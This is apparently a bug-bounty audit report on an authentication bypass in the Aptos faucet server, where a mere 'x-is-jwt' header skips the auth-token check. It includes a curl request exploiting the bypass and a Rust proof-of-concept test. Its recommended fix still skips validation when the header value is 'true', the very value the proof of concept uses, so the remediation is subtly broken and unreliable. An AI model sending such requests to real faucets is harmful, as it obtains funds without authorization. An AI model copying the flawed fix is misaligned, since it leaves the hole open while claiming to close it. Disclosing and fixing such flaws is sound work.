# Audit Report

## Title
Authentication Bypass in Faucet Server via X_IS_JWT_HEADER Header Injection

## Summary
An unprivileged user can bypass the faucet's `AuthTokenChecker` authentication requirement by simply adding an `x-is-jwt` HTTP header with any value to their request. This allows unauthorized access to faucet operations including funding arbitrary accounts and bypassing the auth token security control intended to restrict privileged operations.

## Finding Description

The vulnerability exists in the faucet server's `AuthTokenChecker` implementation, which is designed to validate that requests include a valid authentication token from an allowlist before permitting faucet operations. [1](#0-0) 

The checker uses `data.headers.contains_key(X_IS_JWT_HEADER)` to detect JWT-based authentication, returning immediately without validation if the header key exists. This check only verifies the **presence** of the header, not its value. The intended design is that when JWT authentication is used (indicated by `x-is-jwt: true`), the static auth token check should be skipped, and JWT validation should occur elsewhere.

However, JWT validation only happens when `RedisRatelimitChecker` is configured with JWT validation enabled: [2](#0-1) 

**Attack Path:**
1. Faucet server is configured with `AuthTokenChecker` to require valid auth tokens
2. Faucet may or may not have `RedisRatelimitChecker` with JWT validation configured
3. Attacker sends a funding request with header: `x-is-jwt: <any_value>` (e.g., "false", "", "invalid")
4. `AuthTokenChecker.check()` detects the header exists and returns `Ok(vec![])` (no rejections)
5. If JWT validation is not configured, no authentication check occurs
6. Request proceeds to funding without proper authorization

The checker's logic path: [3](#0-2) 

An attacker bypasses lines 42-53 entirely by triggering the early return at line 39.

The client-side code shows how auth tokens are meant to be used: [4](#0-3) [5](#0-4) 

Auth tokens are documented as mechanisms to "bypass faucet ratelimits" and gate privileged operations.

## Impact Explanation

This vulnerability allows **unauthorized access to privileged faucet operations**, meeting the **High Severity** criteria per the Aptos bug bounty program as a "Significant protocol violation."

**Direct Impacts:**
1. **Bypass Authentication Control**: Attackers can completely circumvent the auth token requirement without possessing a valid token
2. **Unauthorized Account Funding**: Any account address can be funded, including validator accounts, without proper authorization
3. **Rate Limit Bypass Mechanism Defeat**: If auth tokens are the only checker, all rate limits and security controls are bypassed

**Scope of Impact:**
- Affects any faucet deployment using `AuthTokenChecker` without proper JWT validation
- Testnet/devnet faucets are primary targets where authentication is critical for preventing abuse
- The vulnerability breaks the **Access Control** invariant - authentication mechanisms must properly validate credentials

The security question specifically asks about "bypassing rate limits" - this vulnerability directly enables that by defeating the authentication layer that gates access to privileged operations.

## Likelihood Explanation

**Likelihood: HIGH**

**Attacker Requirements:**
- No special privileges required
- No validator access needed
- Trivial exploitation - add a single HTTP header
- No timing windows or race conditions
- Works deterministically

**Configuration Scenarios:**
The vulnerability is exploitable when:
1. Faucet is configured with `AuthTokenChecker` (common for production/testnet faucets)
2. JWT validation is not properly configured or is optional
3. No additional checkers prevent unauthorized access

**Exploitation Complexity:** Minimal - a single `curl` command:
```bash
curl -X POST http://faucet-url/fund \
  -H "Content-Type: application/json" \
  -H "x-is-jwt: bypass" \
  -d '{"address":"0x123...", "amount":1000000000}'
```

The test infrastructure confirms the expected behavior with valid tokens: [6](#0-5) 

An attacker can achieve the same result without a valid token by exploiting the header check.

## Recommendation

**Fix the authentication bypass by validating both the header's presence AND value:**

```rust
// In crates/aptos-faucet/core/src/checkers/auth_token.rs

async fn check(
    &self,
    data: CheckerData,
    _dry_run: bool,
) -> Result<Vec<RejectionReason>, AptosTapError> {
    // Check if JWT authentication is being used
    let is_jwt_auth = data.headers
        .get(X_IS_JWT_HEADER)
        .and_then(|v| v.to_str().ok())
        .map(|v| v.eq_ignore_ascii_case("true"))
        .unwrap_or(false);
    
    // Only skip auth token validation if JWT auth is properly indicated
    // AND JWT validation is configured elsewhere
    if is_jwt_auth {
        // JWT validation must happen in RedisRatelimitChecker with JWT config
        // This checker should not skip validation unless JWT validation is guaranteed
        return Ok(vec![]);
    }

    // Proceed with normal auth token validation
    let auth_token = match data
        .headers
        .get(AUTHORIZATION)
        .and_then(|v| v.to_str().ok())
        .and_then(|v| v.split_whitespace().nth(1))
    {
        Some(auth_token) => auth_token,
        None => return Ok(vec![RejectionReason::new(
            "Either the Authorization header is missing or it is not in the form of 'Bearer <token>'".to_string(),
            RejectionReasonCode::AuthTokenInvalid,
        )]),
    };
    if self.manager.contains(auth_token) {
        Ok(vec![])
    } else {
        Ok(vec![RejectionReason::new(
            format!(
                "The given auth token is not allowed by the server: {}",
                auth_token
            ),
            RejectionReasonCode::AuthTokenInvalid,
        )])
    }
}
```

**Additional Recommendation:** Create a dedicated `JwtChecker` that validates JWTs independently of rate limiting, ensuring JWT validation always occurs when `x-is-jwt: true` is present.

## Proof of Concept

**Rust Integration Test:**

```rust
#[tokio::test]
async fn test_auth_bypass_via_jwt_header() -> Result<()> {
    // Setup: Create faucet with AuthTokenChecker but no JWT validation
    make_auth_tokens_file(&["valid_token_123"])?;
    
    let config_content = r#"
        server_config:
          listen_address: "0.0.0.0"
          listen_port: 0
        metrics_server_config:
          disable: true
          listen_address: "0.0.0.0"
          listen_port: 0
        bypasser_configs: []
        checker_configs:
          - type: AuthToken
            file: /tmp/auth_tokens.txt
        funder_config:
          type: mint_funder
          # ... funder config ...
        handler_config:
          use_helpful_errors: true
          return_rejections_early: false
    "#;
    
    let (port, _handle) = start_server(config_content).await?;
    
    // Test 1: Request without auth token and without x-is-jwt header - SHOULD FAIL
    let response = reqwest::Client::new()
        .post(get_fund_endpoint(port))
        .body(get_fund_request(Some(100)).to_json_string())
        .header(CONTENT_TYPE, "application/json")
        .send()
        .await?;
    assert_eq!(response.status(), 400); // Should be rejected
    
    // Test 2: Request with invalid auth token - SHOULD FAIL  
    let response = reqwest::Client::new()
        .post(get_fund_endpoint(port))
        .body(get_fund_request(Some(100)).to_json_string())
        .header(CONTENT_TYPE, "application/json")
        .header(AUTHORIZATION, "Bearer invalid_token")
        .send()
        .await?;
    assert_eq!(response.status(), 400); // Should be rejected
    
    // Test 3: EXPLOIT - Request with x-is-jwt header but no valid token - BYPASSES AUTH
    let response = reqwest::Client::new()
        .post(get_fund_endpoint(port))
        .body(get_fund_request(Some(100)).to_json_string())
        .header(CONTENT_TYPE, "application/json")
        .header("x-is-jwt", "true") // Bypass header
        .send()
        .await?;
    
    // VULNERABILITY: This should fail but succeeds due to auth bypass
    assert_eq!(response.status(), 200); // Succeeds without authentication!
    
    Ok(())
}
```

**Notes**

This vulnerability represents a critical flaw in the authentication layer design where the intent to support multiple authentication methods (static tokens vs JWT) created a bypass path. The checker assumes JWT validation will occur elsewhere but doesn't enforce that assumption, allowing attackers to exploit the gap between authentication methods. Production faucet deployments relying on `AuthTokenChecker` for access control are vulnerable to complete authentication bypass.

### Citations

**File:** crates/aptos-faucet/core/src/checkers/auth_token.rs (L37-40)
```rust
        // Don't check if the request has X_IS_JWT_HEADER set.
        if data.headers.contains_key(X_IS_JWT_HEADER) {
            return Ok(vec![]);
        }
```

**File:** crates/aptos-faucet/core/src/checkers/auth_token.rs (L42-53)
```rust
        let auth_token = match data
            .headers
            .get(AUTHORIZATION)
            .and_then(|v| v.to_str().ok())
            .and_then(|v| v.split_whitespace().nth(1))
        {
            Some(auth_token) => auth_token,
            None => return Ok(vec![RejectionReason::new(
                "Either the Authorization header is missing or it is not in the form of 'Bearer <token>'".to_string(),
                RejectionReasonCode::AuthTokenInvalid,
            )]),
        };
```

**File:** crates/aptos-faucet/core/src/checkers/redis_ratelimit.rs (L44-50)
```rust
    pub async fn ratelimit_key_value(&self, data: &CheckerData) -> Result<String, AptosTapError> {
        match self {
            RatelimitKeyProvider::Ip => Ok(data.source_ip.to_string()),
            RatelimitKeyProvider::Jwt(jwt_verifier) => {
                jwt_verifier.validate_jwt(data.headers.clone()).await
            },
        }
```

**File:** crates/aptos/src/common/types.rs (L1656-1666)
```rust
#[derive(Debug, Default, Parser)]
pub struct FaucetOptions {
    /// URL for the faucet endpoint e.g. `https://faucet.devnet.aptoslabs.com`
    #[clap(long)]
    pub faucet_url: Option<reqwest::Url>,

    /// Auth token to bypass faucet ratelimits. You can also set this as an environment
    /// variable with FAUCET_AUTH_TOKEN.
    #[clap(long, env)]
    pub faucet_auth_token: Option<String>,
}
```

**File:** crates/aptos/src/common/types.rs (L1711-1727)
```rust
    /// Fund an account with the faucet.
    pub async fn fund_account(
        &self,
        rest_client: Client,
        profile: &ProfileOptions,
        num_octas: u64,
        address: AccountAddress,
    ) -> CliTypedResult<()> {
        fund_account(
            rest_client,
            self.faucet_url(profile)?,
            self.faucet_auth_token.as_deref(),
            address,
            num_octas,
        )
        .await
    }
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L597-608)
```rust
        // Assert that a request that passes all the configured checkers passes.
        unwrap_reqwest_result(
            reqwest::Client::new()
                .post(get_fund_endpoint(port))
                .body(get_fund_request(Some(10)).to_json_string())
                .header(CONTENT_TYPE, "application/json")
                .header(AUTHORIZATION, "Bearer test_token")
                .header("what_wallet_my_guy", "the_wallet_that_rocks")
                .send()
                .await,
        )
        .await?;
```
